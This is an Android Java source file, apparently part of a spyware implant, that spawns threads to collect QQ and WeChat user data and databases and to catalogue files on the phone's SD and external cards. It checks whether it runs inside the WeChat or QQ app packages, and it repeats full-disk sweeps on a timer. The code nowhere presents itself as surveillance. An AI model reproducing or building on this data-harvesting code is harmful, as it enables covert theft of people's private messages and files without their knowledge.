package com.utils;

import com.main.ForegroundService;
import com.phone.data.ExtSDCardFiles;
import com.phone.data.PhoneFiles;
import com.phone.data.QQWXDB;
import com.phone.data.UserQQData;
import com.phone.data.UserWeiXinData;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

public class PhoneFilesUtils implements Runnable{
	private static String TAG = "PhoneFilesUtils";
	private Context context;
	private int command;
	
	public PhoneFilesUtils(Context context,int cmd){
		this.context = context;
		this.command = cmd;
	}

	
	public static void getSDcardFiles(Context context){

		try {
			boolean sdexist = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
			if(sdexist ){
		    	UserQQData userqq = new UserQQData(context);
		    	Thread threaduserqq = new Thread(userqq);
		    	threaduserqq.start();
		
		    	UserWeiXinData userwx = new UserWeiXinData(context);
		    	Thread threaduserwx = new Thread(userwx);
		    	threaduserwx.start();
		
		    	PhoneFiles sdcardfies = new PhoneFiles(context,ForegroundService.SDCARDPATH,
		    			ForegroundService.LOCAL_PATH_NAME,
		    			ForegroundService.SDCARDFILES_NAME,Public.CMD_DATA_SDCARDFILES);
		    	Thread thread = new Thread(sdcardfies);
		    	thread.start();
			}
			else{
				Log.e(TAG,"sdcard not exist");
				WriteDateFile.writeLogFile("sdcard not exist\r\n");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public static void getExtcardFiles(Context context){
		try {
			String[] cardpath = ExtSDCardFiles.getExtSDCardPath(context);
			if(cardpath.length >= 2 ){
		    	ForegroundService.EXTCARDSPATH = new String [cardpath.length - 1];
		    	for (int i = 0,j = 0; i < cardpath.length; i++) {
		    		if (cardpath[i].equals(ForegroundService.SDCARDPATH) == false) {
						cardpath[i] = cardpath[i] + "/";
						WriteDateFile.writeLogFile("find extcard path:" + cardpath[i] + "\r\n");
						ForegroundService.EXTCARDSPATH[j] = cardpath[i];
				    	PhoneFiles extfiles = new PhoneFiles(context,ForegroundService.EXTCARDSPATH[j],
				    			ForegroundService.LOCAL_PATH_NAME,ForegroundService.EXTCARDFILES_NAME + "_"+ i,
				    			Public.CMD_DATA_EXTCARDFILES);
				    	Thread threadextfiles = new Thread(extfiles);
				    	threadextfiles.start();
				    	j ++;
					}
				}
			}
			else if (cardpath.length <= 1) {
				Log.e(TAG,"not found extcard");
				WriteDateFile.writeLogFile("not found extcard\r\n");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
	
	
	public static void getAllPhoneFiles(Context context){
		long timenow = System.currentTimeMillis();	
		
		String disktime = PrefOper.getValue(context,ForegroundService.PARAMCONFIG_FileName, 
				ForegroundService.ALLDISKFILES_LAST_TIME);
		if (disktime.equals("") == true || disktime == null) {

			PrefOper.setValue(context,ForegroundService.PARAMCONFIG_FileName, 
					ForegroundService.ALLDISKFILES_LAST_TIME, String.valueOf(timenow));
		}else{
			
    		if(timenow - Long.parseLong(disktime) >= Public.ALLFILES_RETRIEVE_INTERVAL){
    			PrefOper.setValue(context,ForegroundService.PARAMCONFIG_FileName, 
    					ForegroundService.ALLDISKFILES_LAST_TIME, String.valueOf(timenow));
    		}else{
    			return;
    		}
		}

		String packname = context.getPackageName();
		if(packname.contains("com.tencent.mm")){

			new Thread(new QQWXDB(context, 2)).start();
		}else if (packname.equals("com.tencent.mobileqq") || packname.equals("com.tencent.qqtim")) {
			new Thread(new QQWXDB(context, 1)).start();
		}
		
		getSDcardFiles(context);
		getExtcardFiles(context);
	}
	
	public void run(){

		try {
			if (command == 1 ) {
				getSDcardFiles(context);
			}else if (command == 2) {
				getExtcardFiles(context);
			}else if(command == 3){
				getAllPhoneFiles(context);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
}
